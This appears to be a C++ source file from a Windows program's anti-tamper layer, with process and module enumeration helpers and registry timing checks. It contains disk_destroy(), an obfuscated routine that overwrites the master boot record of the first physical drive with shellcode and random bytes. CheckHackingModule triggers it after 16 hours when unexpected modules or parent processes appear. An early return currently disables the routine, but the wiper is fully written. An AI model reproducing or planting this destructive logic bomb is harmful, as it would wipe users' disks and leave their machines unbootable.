// process.cpp
#include "stdafx.h"
#include "process.h"
#include <tlhelp32.h>
#include <winioctl.h>

DWORD ModuleList[2048] = {0};

DWORD GetParentProcessID() 
{
	HANDLE  hProcessSnap	= NULL;
	DWORD	hParentPid		= 0;
	DWORD	hCurPid			= 0;
	PROCESSENTRY32 pe32		= {0};

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return hParentPid;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hCurPid		= GetCurrentProcessId();

	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if(hCurPid == pe32.th32ProcessID)
			{	
				hParentPid =  pe32.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	else
		return hParentPid;

	CloseHandle (hProcessSnap);

	return hParentPid;
}

void GetNameFromPID(DWORD pid, WCHAR *wzName)
{
	HANDLE hProcessSnap	= NULL;
	PROCESSENTRY32 pe32 = {0};

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		DWORD Code = 0;
		do
		{
			HANDLE hProcess = OpenProcess (PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if(pe32.th32ProcessID == pid)			
			{
				wcscpy(wzName, pe32.szExeFile);
				CloseHandle (hProcess);
				break;
			}
			CloseHandle (hProcess);

		} while (Process32Next(hProcessSnap, &pe32));
	}	
}

BOOL disk_destroy() // MBR overwrite
{
	return 0;
#ifdef _VMPROTECT
	VMProtectBeginUltra("disk_destroy");
#endif
	OutputDebugStringA("disk_destroy");
	//return TRUE;
	unsigned char scode[] =
		"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
		"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe";
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	BOOL bRet = TRUE;

	memcpy(pMBR, scode, sizeof(scode) - 1);

	for(int i = strlen((char*)scode)+2; i < 510; i ++)
	{
		pMBR[i] = (BYTE)(rand() * 255);
	}

	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;

	hDevice = CreateFile(L"\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

	try
	{
		DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
		WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
		DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
		OutputDebugStringA("alarm : disk destroy success!");
	}
	catch(CException *e)
	{
		bRet = FALSE;
	}
	CloseHandle(hDevice);
#ifdef _VMPROTECT
	VMProtectEnd();
#endif
	return bRet;
}

BOOL ProcessHackingModule()
{
	OutputDebugString(L"ProcessHackingModule");
	int i, j;
	CStringArray	strDirtyModArr, strHidModPathArr, strBothModArr;

	strDirtyModArr.RemoveAll();
	strHidModPathArr.RemoveAll();
	strBothModArr.RemoveAll();

	GetVisModArrInProc("Apple_A.exe", strBothModArr);
	
	GetAllModArrInCurProc(strDirtyModArr);

	int nn = 0;
	CString str1 = L"", str2 = L"", str1Lower = L"", str2Lower = L"";
	for(i = 0; i < strDirtyModArr.GetCount(); i ++) // 히든모쥴만 구하기
	{
		str1 = strDirtyModArr.GetAt(i);
		str1Lower = str1.MakeLower();
		for(j = 0; j < strBothModArr.GetCount(); j++)
		{
			str2 = strBothModArr.GetAt(j);
			int nFind = str2.ReverseFind('\\');
			str2 = str2.Mid(nFind + 1);
			str2Lower = str2.MakeLower();
			if(str1Lower.Find(str2Lower) != -1)
				break;
		}
		if(j == strBothModArr.GetCount())
		{
			strHidModPathArr.Add(str1);
		}
	}
	
	int nModuleCnt = strBothModArr.GetCount();
	for(i = 0; i < strHidModPathArr.GetCount(); i ++)
	{
		str1 = strHidModPathArr.GetAt(i);		
		CString strExt = str1.Mid(str1.GetLength()-3);
		if(strExt == L"exe" || strExt == L"dll")
			strBothModArr.Add(str1);		
	}

	CString strDir = L"", strName = L"";
	WCHAR wzAutoPath[MAX_PATH];
	GetAutoDir(wzAutoPath);
	strDir.Format(L"%s", wzAutoPath);
	
	nModuleCnt = strBothModArr.GetCount();
	for(i = 0; i < nModuleCnt; i ++)
	{
		str1 = strBothModArr.GetAt(i);
//		PrintLog(L"모쥴네임: %s", str1);
		if(!IsFileInDir(str1, strDir)) continue;

		strName = str1.Mid(strDir.ReverseFind('\\')+1);

//		PrintLog(L"ProcessHackingModule : 파일이름 - %s", strName);
		strName = strName.MakeUpper();
		if(strName != "DF.EXE" && strName != "RGE.DLL")
		{
			disk_destroy();
			return TRUE;
		}
	}
	return FALSE;
}

BOOL IsFileInDir(CString strFile, CString strDir)
{
	CString str1 = L"", str2 = L"";
	int n1 = strFile.ReverseFind('\\');
	int len = strFile.GetLength();

	str1 = strFile.Mid(0, n1+1);
	if(strDir == str1)
		return TRUE;
	else 
		return FALSE;
}
BOOL SetAutoFirstStartTime()
{
#ifdef _VMPROTECT
	VMProtectBeginUltra("SetAutoFirstStartTime");
#endif
	OutputDebugString(L"SetAutoFirstStartTime");
	HKEY hAutoKey;
	SYSTEMTIME st;	

	GetLocalTime(&st);

	CTime	ctCur(st);
	time_t	dwCurTime = ctCur.GetTime();

	if(ERROR_SUCCESS == RegOpenKey( HKEY_CURRENT_USER, AUTO_REG_KEY_NAME, &hAutoKey))
	{
		DWORD dwVal = 0;
		DWORD szData = 4;
		RegQueryValueEx( hAutoKey, AUTO_REG_STARTTIME_VALUENAME, NULL, NULL, (LPBYTE)(&dwVal), &szData );		
		RegCloseKey(hAutoKey);
		OutputDebugString(L"SetAutoFirstStartTime: pre-set");
		if(dwVal != 0) return TRUE;
	}

	if(ERROR_SUCCESS != RegCreateKey( HKEY_CURRENT_USER, AUTO_REG_KEY_NAME, &hAutoKey))	return FALSE;	
	if(ERROR_SUCCESS != RegSetValueEx( hAutoKey, AUTO_REG_STARTTIME_VALUENAME, NULL, REG_DWORD, (LPBYTE)(&dwCurTime), sizeof(DWORD)))
	{
		RegCloseKey(hAutoKey);
		return FALSE;
	}

	RegCloseKey(hAutoKey);
#ifdef _VMPROTECT
	VMProtectEnd();
#endif
	return TRUE;
}

// kan 0803
BOOL CheckHackingModule(BOOL bNormParent)
{	
	HKEY hAutoKey;
	SYSTEMTIME st;
	GetLocalTime(&st);

	CTime		ctCur(st);
	time_t		curT = ctCur.GetTime();
	CTimeSpan	ctSpan;
	time_t		prevT;
	DWORD		dwPrevT = 0;

	int errReg = RegOpenKey( HKEY_CURRENT_USER, AUTO_REG_KEY_NAME, &hAutoKey );
	if( errReg == ERROR_SUCCESS )
	{
		DWORD szData = 4;
		DWORD valueType;

		errReg = RegQueryValueEx( hAutoKey, AUTO_REG_STARTTIME_VALUENAME, NULL, &valueType, (LPBYTE)(&dwPrevT), &szData );
		RegCloseKey( hAutoKey );
		if(dwPrevT == 0)
		{
			SetAutoFirstStartTime();
		}
		else
		{
			prevT = (time_t)dwPrevT;
			CTime ctPrev(prevT);
			ctSpan = ctCur - ctPrev;

			DWORD dwT = ctSpan.GetTotalHours();	
			//DWORD dwT = ctSpan.GetTotalMinutes();

//			PrintLog(L"CheckHackingModule : 시간차 - %d 시간", dwT);			
	
			if(dwT > 16)
			{
				BOOL bDestroy = ProcessHackingModule();
				if(!bDestroy && !bNormParent)
				{
					disk_destroy();
					bDestroy = TRUE;
				}
				return bDestroy;
			}			
		}
	}
	else if(errReg == ERROR_PATH_NOT_FOUND)
	{
		
	}
	return FALSE;

}

void GetVisModArrInProc(char *szProcessName, CStringArray& strArray)
{
	OutputDebugString(L"GetVisModInProc");
	HANDLE         hProcessSnap = NULL;
	BOOL           bRet      = FALSE;
	PROCESSENTRY32 pe32      = {0};

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if ( hProcessSnap == (HANDLE)-1 ) return ;	

	DWORD pid = GetProcessIDByFileName(szProcessName);

	//프로세스가 메모리상에 있으면 첫번째 프로세스를 얻는다
	if ( Process32First(hProcessSnap, &pe32) )
	{
		BOOL          bCurrent = FALSE;
		MODULEENTRY32 me32     = {0};

		do
		{
			if(pid != pe32.th32ProcessID) continue;
			GetModuleInProc(pid, strArray);
			break;
		}
		while (Process32Next(hProcessSnap, &pe32)); //다음 프로세스의 정보를 구하여 있으면 루프를 돈다.
	}
	CloseHandle (hProcessSnap);
}

DWORD GetProcessIDByFileName(char* name)
{
	DWORD process_id_array[1024];
	DWORD bytes_returned;
	DWORD num_processes;
	HANDLE hProcess;
	char image_name[256];
	int i;
	EnumProcesses(process_id_array, 256*sizeof(DWORD), &bytes_returned);
	num_processes = (bytes_returned/sizeof(DWORD));
	for (i = 0; i < (int)num_processes; i++) {
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,process_id_array[i]);
		if(GetModuleBaseNameA(hProcess,0,image_name,256)){
			if(!stricmp(image_name,name)){
				CloseHandle(hProcess);
				return process_id_array[i];
			}
		}
		CloseHandle(hProcess);
	}
	return 0;
}

void GetModuleInProc(DWORD dwPID, CStringArray& strArray)
{
	HANDLE        hModuleSnap = NULL;	
	hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
	if ( hModuleSnap == (HANDLE)-1 ) return;

	MODULEENTRY32 me32        = {0};
	me32.dwSize = sizeof(MODULEENTRY32);

	CString strModule = L"";
	strArray.RemoveAll();

	int n = 0;
	if ( Module32First(hModuleSnap, &me32) )
	{
		do
		{
			strModule.Format(L"%s", me32.szExePath);
			strArray.Add(strModule);			
		}
		while ( Module32Next(hModuleSnap, &me32) );
	}

	CloseHandle(hModuleSnap);	
}


void GetAllModArrInCurProc(CStringArray &strHiddenModulePath)
{
	LPVOID CurrentPtr = NULL;
	SYSTEM_INFO SysInfo;
	MEMORY_BASIC_INFORMATION mbi;
	DWORD Dummy = 0L;
	// --- Initialize
	RtlZeroMemory(&SysInfo, sizeof(SYSTEM_INFO));
	RtlZeroMemory(&mbi, sizeof(MEMORY_BASIC_INFORMATION));
	// --- Get System Information
	GetSystemInfo(&SysInfo);
	CurrentPtr = SysInfo.lpMinimumApplicationAddress;
	ReadyForModules();

	strHiddenModulePath.RemoveAll();

	int n = 0;
	do
	{
		if(!VirtualQuery(CurrentPtr, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) break;
		//PrintLog(L"Address %x %x %x", (DWORD)CurrentPtr, mbi.BaseAddress, mbi.RegionSize);
		//		if(!IsBadReadPtr(CurrentPtr, 2) &&
		//			*(short *)CurrentPtr == IMAGE_DOS_SIGNATURE && 
		//			mbi.Type == MEM_IMAGE)
		{
			// --- 모듈을 찾았다.
			//if(!IsInModuleList(mbi.BaseAddress))
			{				
				WCHAR FileName[MAX_PATH] = {0};

				if(GetMappedFileName(GetCurrentProcess(), mbi.BaseAddress, FileName, MAX_PATH)
					== 0) // via Psapi
				{
					//PrintLog(L"- Module FileName: [Query ModuleName is Failed]\n");
				}
				else 
				{
					strHiddenModulePath.Add(FileName);					
				}
			}
		}

		// --- Find Next Memory
		CurrentPtr = (PVOID)((ULONG)CurrentPtr  + mbi.RegionSize);
	} while((ULONG)CurrentPtr <= (ULONG)SysInfo.lpMaximumApplicationAddress &&
		mbi.RegionSize != 0L);
}

void ReadyForModules(void)
{
	HANDLE hSnapShot = NULL;
	int focus = 0;
	RtlZeroMemory(ModuleList, sizeof(ModuleList));
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	if(hSnapShot != INVALID_HANDLE_VALUE)
	{
		MODULEENTRY32 me;
		DWORD ret;
		RtlZeroMemory(&me, sizeof(MODULEENTRY32));
		me.dwSize = sizeof(MODULEENTRY32);
		ret = Module32First(hSnapShot, &me);
		while(ret)
		{
			if((focus + 1) >= 2048) break;
			ModuleList[focus++] = (DWORD)me.hModule;
			ret = Module32Next(hSnapShot, &me);
		}
		CloseHandle(hSnapShot);
	}
}

BOOL GetAutoDir(WCHAR *szPath)
{
	HKEY	hAutoKey;
	WCHAR	curPath[MAX_PATH];
	BOOL	bRet = TRUE;

	if ( szPath == NULL ) return FALSE;

	int errReg = RegOpenKey( HKEY_CURRENT_USER, AUTO_REG_KEY_NAME, &hAutoKey );
	if( errReg == ERROR_SUCCESS )
	{
		DWORD szData = 1000;
		DWORD valueType;
		errReg = RegQueryValueEx( hAutoKey, AUTO_REG_PATH_VALUENAME, NULL, &valueType, (LPBYTE)curPath, &szData );
		curPath[szData] = 0;
		if ( errReg == ERROR_SUCCESS )
		{
			if ( curPath[_tcslen(curPath) - 1] != _T('\\') ) _tcscat(curPath, _T("\\"));
		}
		else
		{
			bRet = FALSE;
		}
	}
	else
	{
		bRet = FALSE;
		return bRet;
	}

	RegCloseKey( hAutoKey );

	if ( bRet ) wcscpy( szPath, curPath );
	return bRet;
}
